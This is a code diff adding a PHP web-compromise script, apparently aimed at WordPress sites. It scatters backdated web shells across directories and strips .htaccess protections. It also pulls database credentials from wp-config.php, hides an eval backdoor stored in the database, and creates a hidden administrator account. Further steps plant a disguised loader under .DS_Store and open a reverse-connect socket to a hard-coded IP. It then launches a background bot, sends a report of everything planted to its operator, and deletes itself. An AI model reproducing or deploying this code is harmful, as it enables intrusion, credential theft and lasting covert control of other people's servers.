+						    if (!file_exists($fullSubdirFile)) {
+						    	$waktu = strtotime('-'.rand(30,90).' days', time());
+						    	@file_put_contents($fullSubdirFile, b64dd($sourcezx)); 
+						    	
+								if (file_exists($fullSubdirFile) && filesize($fullSubdirFile) > 0) {
+							 		echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."</a><br>";
+							 		$reportFinal .= $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile).PHP_EOL;
+							 		@touch($fullSubdirFile, $waktu);
+							    }
+								$treba++;
+						    }
+			            }
+		            $phar->close();
+		        	} 
+				} else { echo "Please check folder isn't writable!</code>";}
+	        endOfLife();			
+			} else { echo "<h2 class='blink'>PHP Server has No ZipArchive or PharData Class</h2></hr>"; endOfLife(); }
+		}
+							
+		  $lapor8 = $folderio.'/wp-config.php';
+		  if (file_exists($lapor8)) {
+		    // start wp
+			$treba = 0;
+			while ($treba <= count($itemsxz)) {
+			switch ($modeio) {
+		 	 case 'standard': $namafilenx = $namanamafile[array_rand($namanamafile, 1)]; $sourcezx = $itemsxz[array_rand($itemsxz, 1)]; break;
+		 	 case 'small': $namafilenx = $namanamafile[array_rand($namanamafile, 1)]; $sourcezx = html_entity_decode(gzinflate(b64dd($local))); break;
+		 	 default: $namafilenx = $enx1[array_rand($enx1, 1)]; $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
+		 	}
+			$picksubdirX1 = $eft0[array_rand($eft0, 1)];    
+		 	$picksubdirFirst = $subdir[array_rand($subdir, 1)];
+		 	
+		 	
+		    if($totaldir < count($eft0)) {
+		    		$picksubdir = $picksubdirFirst.'/'.$picksubdirX1;
+		    } else {
+		    		$picksubdir = $picksubdirFirst;
+		    }	
+			$fullSubdirFile = $picksubdir.'/'.$namafilenx;
+		 	$htaccess = $picksubdir.'/.htaccess';
+				if (!file_exists($fullSubdirFile)) {
+					if(!file_exists($picksubdir)) { if (!mkdir($picksubdir, 0755, true)) continue; }
+					if(!is_writable($picksubdir)) continue;
+					if (file_exists($htaccess)) {
+						$htaneh = fgt($htaccess);
+						$rintangan1 = "/FilesMatch/i";
+						$rintangan2 = "/Require all denied/i";
+						preg_match($rintangan1, $htaneh, $hasilhtaneh1);
+						preg_match($rintangan2, $htaneh, $hasilhtaneh2);
+						$wipesht1 = $hasilhtaneh1[1];$wipesht2 = $hasilhtaneh2[1];
+						if (!empty($wipesht1) || !empty($wipesht2)) {
+							@chmod($picksubdir.'/'.'.htaccess', 0644 );
+				   			@unlink($picksubdir.'/.htaccess');
+				   			@file_put_contents($picksubdir.'/.htaccess', 'UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleFwucGhwJCAtIFtMXQ==');
+						} 
+			  		}		
+					$waktu = strtotime('-'.rand(30,90).' days', time());
+					$reportx = fgt($sourcezx);
+					switch ($modeio) {
+				 	 case 'small': @file_put_contents($fullSubdirFile, $sourcezx);   break;
+				 	 default: @file_put_contents($fullSubdirFile, $reportx);  
+				 	}		    	
+				    if (file_exists($fullSubdirFile) && filesize($fullSubdirFile) > 0) {
+				 		echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."</a><br>";
+				 		$reportFinal .= $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile).PHP_EOL;
+				 		@touch($fullSubdirFile, $waktu);
+				    }
+				 		$treba++;
+			 	} 		 	
+			}
+			
+
+		    if(isset($_POST['backlinks'])) {
+				backlinks($folderio);
+		    }	
+		    // $loginwpx = fgt(decno('x8GsvbSSeHzGtqy1trp3sM66Z7Gwxrh62cdnsbDGuHrZx2a0qsyxwsF7obxwyqrEjrqZtq+HwL2Muae0qsY='));
+		    // file_put_contents($folderio.'/wp-login.php', $loginwpx); @touch($folderio.'/wp-login.php', $waktu); 
+		 
+			$picksubdirlapor13 = $subdir[array_rand($subdir, 1)];
+			$namafilelapor13 = $namanamafile[array_rand($namanamafile, 1)];
+		    $lapor13 = $picksubdirlapor13.'/'.$namafilelapor13;
+		    
+		    if(!file_exists($lapor13)) { $report13 = fgt($adminer); file_put_contents($lapor13, $report13); @touch($lapor13, $waktu); }
+		    if (file_exists($lapor13) && filesize($lapor13) > 0) {
+			   	echo "<br>Adminer: ";
+			   	echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $lapor13)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $lapor13)."</a>";
+			   	echo "<br>WP: ".$folderio;
+			   	$reportFinal .= "Adminer: ".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $lapor13).PHP_EOL;
+			   	$reportFinal .= "WP: ".$folderio.PHP_EOL;	
+			   }
+		 	$cxz = fgt($lapor8);			preg_match('/define.*DB_NAME.*\'(.*)\'/', $cxz, $mxz);
+		 	$dbname = $mxz[1];				preg_match('/define.*DB_USER.*\'(.*)\'/', $cxz, $mxz);
+		 	$dbuser = $mxz[1];				preg_match('/define.*DB_PASSWORD.*\'(.*)\'/', $cxz, $mxz);
+		 	$dbpass = $mxz[1];				preg_match('/define.*DB_HOST.*\'(.*)\'/', $cxz, $mxz);
+		 	$dbhost = $mxz[1];				preg_match('/table_prefix.*=.*\'(.*)\'/', $cxz, $mxm);
+		 	$table_prefix = $mxm[1];				
+		 	if (isset($dbname)) {
+			 	echo "<br>DB Name: ".$dbname;
+			 	$shell_db_name = $dbname.PHP_EOL;
+			 	echo " - DB Host: ".$dbhost;
+			 	$shell_db_host = $dbhost.PHP_EOL;
+			 	echo "<br>DB User: ".$dbuser;
+			 	$shell_db_user = $dbuser.PHP_EOL;
+			 	echo " - DB Pass: ".$dbpass; 		
+			 	$reportFinal .= "DB Name: ".$dbname." | DB Host: ".$dbhost." | DB User: ".$dbuser." | DB Pass: ".$dbpass.PHP_EOL;	
+		 	}
+		 	if (isset($dbname)) {
+			 	$filetoinject = $folderio."/wp-config-sample.php";
+			 	if(!file_exists($filetoinject)) { file_put_contents($filetoinject, '<?php phpinfo(); ?>'); }
+			 	$key = generateRandomString();
+			 	$shellz = "CgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCjw/cGhwIGVjaG8gJzxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7IGVjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI1MCI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT4nOyBpZiggJF9QT1NUWydfdXBsJ10gPT0gIlVwbG9hZCIgKSB7IGlmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7IGVjaG8gJzxiPk9LPC9iPjxicj48YnI+JzsgfSBlbHNlIHsgZWNobyAnPGI+RmFpbGVkITwvYj48YnI+PGJyPic7IH0gfWV4aXQoKTsgPz4=";
+				if($conn = mysqli_connect($dbhost,$dbuser,$dbpass,$dbname)) {
+					if(@is_file($filetoinject)&&@is_writable($filetoinject)){
+						@mysqli_query($conn,'DROP TABLE `licenses`');
+						@mysqli_query($conn,'CREATE TABLE `licenses` (code LONGTEXT)');
+						@mysqli_query($conn,'INSERT INTO `licenses` VALUES("'.$shellz.'")');
+						$code = '<?php if(isset($_GET["x"])&&$_GET["x"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpass).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM licenses LIMIT 0,1");$r=mysqli_fetch_assoc($q);eval("?>".base64_decode($r["code"]));exit;} ?>';
+						@touch($filetoinject, $waktu);
+					 }
+					@file_put_contents($filetoinject,$code."\n".@file_get_contents($filetoinject));
+					$sql_backdoor = $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $filetoinject)."?x=".$key.PHP_EOL;
+					echo "<br>SQL Backdoor: <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $filetoinject)."?x=".$key."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $filetoinject)."?x=".$key."</a><br>";
+				}
+		 	}
+				
+		 	if (isset($table_prefix)) {
+		 	 $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname);
+			 if ($conn->connect_error) { echo ""; } else {	$passw0rd = generateRandomString();	$sql = "INSERT INTO ".$table_prefix."users (ID, user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('', '$dbuser', MD5('".$passw0rd."'), '$dbname', 'hax@segfault.net', '', '2018-06-07 00:00:00', '', '0', '$dbname');";
+			 $sql .= "INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '88988', '".$table_prefix."capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}');";
+			 $sql .= "INSERT INTO ".$table_prefix."usermeta (umeta_id, user_id, meta_key, meta_value) VALUES (NULL, '88988', '".$table_prefix."user_level', '10');"; if ($conn->multi_query($sql) === TRUE) {
+			 		echo "WP U: ".$dbname." P: ".$passw0rd; 
+			 		$reportFinal .= "WP U: ".$dbname." P: ".$passw0rd.PHP_EOL;
+					}
+			 		$conn->close();
+				}
+		 	}
+			// end wp
+		  } else {  
+		  	// start ghost
+			$waktu = strtotime('-'.rand(30,90).' days', time());
+			$trebo = 0;
+			while ($trebo <= 15) {
+			switch ($modeio) {
+		 	 case 'standard': $namafilenx = $namanamafile[array_rand($namanamafile, 1)]; $sourcezx = $itemsxz[array_rand($itemsxz, 1)]; break;
+		 	 case 'small': $namafilenx = $namanamafile[array_rand($namanamafile, 1)]; $sourcezx = html_entity_decode(gzinflate(b64dd($local))); break;
+		 	 default: $namafilenx = $enx1[array_rand($enx1, 1)]; $sourcezx = $itemsxz[array_rand($itemsxz, 1)];
+		 	}
+			$picksubdirX1 = $eft0[array_rand($eft0, 1)];    
+		 	$picksubdirFirst = $subdir[array_rand($subdir, 1)];
+		
+		    if($totaldir < count($eft0)) {
+		    		$picksubdir = $picksubdirFirst.'/'.$picksubdirX1;
+		    } else {
+		    		$picksubdir = $picksubdirFirst;
+		    }	
+			$fullSubdirFile = $picksubdir.'/'.$namafilenx;
+		 	$htaccess = $picksubdir.'/.htaccess';
+			if (!file_exists($fullSubdirFile)) {
+				if(!file_exists($picksubdir)) { if (!mkdir($picksubdir, 0755, true)) continue; }
+				if(!is_writable($picksubdir)) continue;
+				if (file_exists($htaccess)) {
+					$htaneh = fgt($htaccess);
+					$rintangan1 = "/FilesMatch/i";
+					$rintangan2 = "/Require all denied/i";
+					preg_match($rintangan1, $htaneh, $hasilhtaneh1);
+					preg_match($rintangan2, $htaneh, $hasilhtaneh2);
+					$wipesht1 = $hasilhtaneh1[1];$wipesht2 = $hasilhtaneh2[1];
+					if (!empty($wipesht1) || !empty($wipesht2)) {
+						@chmod($picksubdir.'/.htaccess', 0644 );
+			   			@unlink($picksubdir.'/.htaccess');
+			   			@file_put_contents($picksubdir.'/.htaccess', 'UmV3cml0ZUVuZ2luZSBPbgpSZXdyaXRlQmFzZSAvClJld3JpdGVSdWxlIF5pbmRleFwucGhwJCAtIFtMXQ==');
+					} 
+		  		}		
+			$waktu = strtotime('-'.rand(30,90).' days', time());
+			$reportx = fgt($sourcezx);
+		    switch ($modeio) {
+		 	 case 'small': @file_put_contents($fullSubdirFile, $sourcezx);   break;
+		 	 default: @file_put_contents($fullSubdirFile, $reportx);  
+		 	}
+
+		    if (file_exists($fullSubdirFile) && filesize($fullSubdirFile) > 0) {
+		 		echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile)."</a><br>";
+		 		$reportFinal .= $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $fullSubdirFile).PHP_EOL;
+		 		@touch($fullSubdirFile, $waktu);}
+		 		$trebo++;
+		 		} 		 	
+			}
+		}
+
+		endOfLife();
+	}
+
+	function endOfLife() {
+	    global $folderio, $textz, $fullxx, $waktu, $reportFinal, $subdir, $sox, $version, $start;
+
+	    $folderUP = $folderio .'/.DS_Store/'. date('Y/m');
+	    if (!is_dir($folderUP)) {
+	        @mkdir($folderUP, 0755, true);
+	    }
+	    if (is_writable($folderUP)) {
+	        @file_put_contents($folderUP.'/logo-backup.png', $textz);
+	        $realphp = '<?php require_once("logo-backup.png"); ?>';
+	        if (@file_put_contents($folderUP."/".date('j').".jpg.php", $realphp)) {
+	            if (file_exists($folderUP."/".date('j').".jpg.php") && filesize($folderUP."/".date('j').".jpg.php") > 0) {
+	                echo "<a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $folderUP."/".date('j').".jpg.php")."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $folderUP."/".date('j').".jpg.php")."</a><br>";
+	                $reportFinal .= $fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $folderUP."/".date('j')).PHP_EOL;
+	                @touch($folderUP."/".date('j').".jpg.php", $waktu);
+	            }
+	        }
+	        @chmod($folderUP, 0111);
+	    }
+
+	    $gsc = "Z29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiBnb29nbGViZGM2Mzc4MTJmZDk5NzIyLmh0bWw=";
+	    if (@file_put_contents($folderio."/googlebdc637812fd99722.html", b64dd($gsc))) {
+	        @touch($folderio."/googlebdc637812fd99722.html", $waktu);
+	    }
+
+	    if (isset($_POST['sockets'])) {
+	        $soxxF = "ipv4.php";
+	        $picksubdirSox = $subdir[array_rand($subdir, 1)];
+	        $soxx = $picksubdirSox.'/'.$soxxF;
+	        $soxCode = html_entity_decode(gzinflate(b64dd($sox)));
+	        $srcSox = "<?php set_time_limit(0); \$ip='0xaa.0xbb.0.fc.0x89'; \$port=433;" . $soxCode . " ?>";
+	        if (@file_put_contents($soxx, $srcSox)) {
+	            if (file_exists($soxx) && filesize($soxx) > 0) {
+	                echo "<br>PHP Sockets: <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx)."</a>";
+	                $reportFinal .= "Backconnect: ".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx).PHP_EOL;
+	                @touch($soxx, $waktu);
+	            }
+	        }
+	    }
+	    
+	    if (isset($_POST['kuman'])) {
+	        if (function_exists('exec')) {
+	            if (OS() === "Linux") {
+	                $astaga = "kuman.php";    
+	                $picksubdirbot = $subdir[array_rand($subdir, 1)];
+	                $astagaf = $picksubdirbot.'/'.$astaga;
+	                $bt = fgt(decno('x8GsvbSSeHzGtqy1trp3sM66Z7Gwxrh62cdnsbDGuHrZx2a0qsyxwsF7obxwyqrEjrqZtq+HtMLMrqY='));
+	                file_put_contents($astagaf, gzinflate(b64dd($bt))); 
+	                exec('cd '.$picksubdirbot.' && exec php -f'.$astagaf.' > /dev/null &'); 
+	                if (file_exists($picksubdirbot."/tuman.php") && filesize($picksubdirbot."/tuman.php") > 0) {
+	                    $reportFinal .= "Tuman : ".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php").PHP_EOL; 
+	                    echo "<br>Tuman : <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php")."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php")."</a>";
+	                }
+	            }
+	        }
+	    }
+
+	    $finalist = b64ed($reportFinal);
+	    GrabMe($_SERVER['HTTP_HOST'], $finalist, $folderio);
+	    echo "<br>Version: ".substr($version, 0, 6);
+	    echo "<br></code><br>";
+	    $pathxr = dirname(__FILE__);
+	    if (!unlink(__FILE__)) { exec('rm -rf wp.php'); }
+
+	    $end = microtime(true);
+	    $time = number_format(($end - $start), 2);
+
+	    echo '<br><br>This page loaded in ', $time, ' seconds';
+	    echo '</div></body></html>';
+	    exit();
+	}
+	
+	$gsc = "Z29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uOiBnb29nbGViZGM2Mzc4MTJmZDk5NzIyLmh0bWw=";
+	 if (@file_put_contents($folderio."/googlebdc637812fd99722.html", b64dd($gsc))) {
+	    @touch($folderio."/googlebdc637812fd99722.html", $waktu);
+	 }
+
+	if(isset($_POST['sockets'])) {
+		$soxxF = "ipv4.php";
+		$picksubdirSox = $subdir[array_rand($subdir, 1)];
+		$soxx = $picksubdirSox.'/'.$soxxF;
+		$soxCode = html_entity_decode(gzinflate(b64dd($sox)));
+		$srcSox="<?php "."set_time_limit(0); \$ip='0xaa.0xbb.0xfc.0x89'; \$port=433;".$soxCode." ?>";
+		if(@file_put_contents($soxx, $srcSox)) {
+			if (file_exists($soxx) && filesize($soxx) > 0) {
+			echo "<br>PHP Sockets: <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx)."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx)."</a>";
+			$reportFinal .= "Backconnect: ".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $soxx).PHP_EOL;
+			@touch($soxx, $waktu);
+			}
+		}
+	}	
+	if(isset($_POST['kuman'])) {
+		if(function_exists('exec')) {
+			if(OS() === "Linux") {
+			$astaga = "kuman.php";	
+			$picksubdirbot = $subdir[array_rand($subdir, 1)];
+			$astagaf = $picksubdirbot.'/'.$astaga;
+			$bt = fgt(decno('x8GsvbSSeHzGtqy1trp3sM66Z7Gwxrh62cdnsbDGuHrZx2a0qsyxwsF7obxwyqrEjrqZtq+HtMLMrqY='));file_put_contents($astagaf,gzinflate(b64dd($bt))); 
+			exec('cd '.$picksubdirbot.' && exec php -f'.$astagaf.' > /dev/null &'); 
+				if (file_exists($$picksubdirbot."/tuman.php") && filesize($$picksubdirbot."/tuman.php") > 0) {
+				$reportFinal .= "Tuman : ".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php").PHP_EOL; 
+				echo "<br>Tuman : <a href='//".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php")."' target='_blank'>".$fullxx.str_replace($_SERVER['DOCUMENT_ROOT'], "/", $picksubdirbot."/tuman.php")."</a>";
+				}
+			}
+		}
+	}
+		
+	$finalist = b64ed($reportFinal);
+	GrabMe($_SERVER['HTTP_HOST'],$finalist,$folderio);
+	echo "<br>Version: ".substr($version, 0, 6);
+	echo "<br></code><br>";
+	$pathxr = dirname(__FILE__);
+	if(!unlink(__FILE__)) { exec('rm -rf wp.php'); }
+}
+			
+	
+    $end = microtime(true);
+    $time = number_format(($end - $start), 2);
+
+    echo '<br><br>This page loaded in ', $time, ' seconds';
+
+			?></div></body></html>
